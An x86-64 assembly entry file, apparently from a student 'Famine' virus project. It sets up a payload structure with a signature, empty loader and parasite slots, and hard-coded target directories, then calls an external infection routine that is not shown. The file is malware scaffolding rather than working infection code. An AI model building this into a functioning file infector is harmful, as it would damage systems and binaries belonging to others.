global _start
extern _famine

section .rodata

targets dq target1, target2, 0
target1 db "/home/mbucci/tmp/test",0
target2 db "/home/mbucci/tmp/test2",0

signature db "Famine version 1.0 (c)oded by mbucci-jdecorte",0
loader db ""
parasite db ""

section .text

;struct s_famine {
;    char               **targets;
;    uint64_t           signaturesz;
;    uint64_t           loadersz;
;    uint64_t           parasitesz;
;    char[PAYLOAD_SIZE] payload;
;}

SIGNATURE_SIZE equ 46
LOADER_SIZE equ 0
PARASITE_SIZE equ 0
PAYLOAD_SIZE equ SIGNATURE_SIZE + LOADER_SIZE + PARASITE_SIZE
STRUCT_FAMINE equ PAYLOAD_SIZE + 32

_start:
    push rbp
    mov rbp, rsp
    sub rsp, STRUCT_FAMINE

    ; TODO: redirect stdin/stderr to /dev/null

    lea rdi, [rbp - STRUCT_FAMINE]
    call _build_payload

    ; void famine;
    lea rdi, [rbp - STRUCT_FAMINE]
    call _famine

    add rsp, STRUCT_FAMINE
    leave

    ; exit(0)
    xor rdi, rdi
    mov rax, 60
    syscall


; void build_payload(buff);
_build_payload:
    push rbp
    mov rbp, rsp

    ; set members in s_famine struct
    lea rax, [rel targets]
    mov qword [rdi], rax
    mov qword [rdi + 8], SIGNATURE_SIZE
    mov qword [rdi + 16], LOADER_SIZE
    mov qword [rdi + 24], PARASITE_SIZE

    add rdi, 32
    push rdi

    ; copy signature to stack
    mov rdx, SIGNATURE_SIZE
    mov rsi, signature
    call _ft_memcpy

    ; copy loader to stack
    mov rdx, LOADER_SIZE
    mov rsi, loader
    mov rdi, qword [rsp]
    add rdi, SIGNATURE_SIZE
    call _ft_memcpy

    ;; copy parasite (famine code) to stack
    ;mov rdx, PARASITE_SIZE
    ;mov rsi, parasite
    pop rdi
    ;add rdi, SIGNATURE_SIZE
    ;add rdi, LOADER_SIZE
    ;call _ft_memcpy

    leave
    ret


; void *ft_memcpy(void *dest, const void *src, size_t size);
_ft_memcpy:
    push rbp
    mov rbp, rsp

    push rdi

    ; copy with QWORD chunks
    mov rcx, rdx
    and rdx, 7   ; rdx %= 8
    sub rcx, rdx ; remove rest from rcx
    shr rcx, 3   ; rcx /= 8
    cld
    rep movsq

    ; finish copy
    mov rcx, rdx
    cld
    rep movsb

.return:
    pop rax
    leave
    ret
